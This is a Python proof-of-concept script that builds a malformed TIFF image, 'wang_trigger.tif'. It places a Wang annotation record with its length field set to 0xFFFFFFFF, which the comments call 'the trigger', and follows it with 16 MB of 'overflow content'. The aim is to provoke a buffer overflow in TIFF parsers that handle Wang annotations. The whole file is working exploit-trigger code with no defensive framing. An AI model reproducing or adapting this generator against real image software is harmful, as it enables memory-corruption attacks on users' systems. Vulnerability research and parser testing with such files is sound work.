import struct, os, sys

TAG_WANG_ANNOTATION = 32932   # 0x80A4 : carries the record OFFST
TAG_WANG_OFFSET      = 32933   # 0x80A5 : value unused; only needs count >= 1
TYPE_SHORT, TYPE_LONG = 3, 4

def annotation_blob(length_field, rec_type, payload):
    b = bytearray()
    b += struct.pack('<I', 0)             # O+0   skipped by fseek(O+4)
    b += struct.pack('<I', 1)             # O+4   header dword : must be non-zero
    b += struct.pack('<I', rec_type)      # O+8   record type: 2 or 6
    b += struct.pack('<I', 0x20)          # O+12  record size (unchecked)
    b += b'OiAnText'                      # O+16  record name
    b += struct.pack('<I', length_field)  # O+24  *** the trigger ***
    b += payload                          # O+28  overflow content
    return bytes(b)

def build_tiff(width=8, height=8, length_field=0xFFFFFFFF, rec_type=2, payload_size=0x1000000):
    pixels = bytes((x * 31 + y * 7) & 0xFF for y in range(height) for x in range(width))
    hdr = b'II' + struct.pack('<HI', 42, 8)
    entries = []
    def E(t, ty, c, v): entries.append([t, ty, c, v])
    E(256, TYPE_LONG, 1, width);  E(257, TYPE_LONG, 1, height)
    E(258, TYPE_SHORT, 1, 8);     E(259, TYPE_SHORT, 1, 1)
    E(262, TYPE_SHORT, 1, 1)
    E(273, TYPE_LONG, 1, 0)                        # StripOffsets
    E(277, TYPE_SHORT, 1, 1);    E(278, TYPE_LONG, 1, height)
    E(279, TYPE_LONG, 1, len(pixels))
    E(TAG_WANG_ANNOTATION, TYPE_LONG, 1, 0)        # offset
    E(TAG_WANG_OFFSET,     TYPE_LONG, 1, 0x7FFFFF) # unused value, count=1 is what matters
    entries.sort(key=lambda e: e[0])               # TIFF requires ascending tag order

    ifd_size  = 2 + 12 * len(entries) + 4
    strip_off = 8 + ifd_size
    blob_off  = strip_off + len(pixels)
    blob = annotation_blob(length_field, rec_type,
                            bytes((i * 41) & 0xFF for i in range(payload_size)))

    for e in entries:
        if e[0] == 273:
            e[3] = strip_off
        if e[0] == TAG_WANG_ANNOTATION:
            e[3] = blob_off

    ifd = struct.pack('<H', len(entries))
    for tag, typ, cnt, val in entries:
        ifd += struct.pack('<HHI', tag, typ, cnt)
        ifd += struct.pack('<I', val) if typ == TYPE_LONG else struct.pack('<HH', val, 0)
    ifd += struct.pack('<I', 0)
    return hdr + ifd + pixels + blob

if __name__ == '__main__':
    out = sys.argv[1] if len(sys.argv) > 1 else '.'
    os.makedirs(out, exist_ok=True)
    path = os.path.join(out, 'wang_trigger.tif')
    open(path, 'wb').write(build_tiff(length_field=0xFFFFFFFF, rec_type=2, payload_size=0x1000000))
    print(path)
